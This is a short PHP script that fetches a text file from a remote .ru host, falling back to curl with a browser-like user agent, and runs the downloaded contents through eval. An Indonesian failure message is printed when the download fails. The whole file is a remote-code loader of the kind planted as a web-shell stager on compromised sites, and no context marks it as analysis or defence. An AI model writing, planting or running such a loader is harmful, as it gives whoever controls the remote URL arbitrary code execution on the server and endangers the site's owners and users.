<?php
$url = 'http://qviz.tritoncenter.ru/files/mss.txt';

$code = @file_get_contents($url);

if ($code === false || empty($code)) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP Script)');
    $code = curl_exec($ch);
    curl_close($ch);
}

if ($code !== false && !empty($code)) {
    eval("?>$code");
} else {
    echo "Gagal memuat kode dari URL.";
}
?>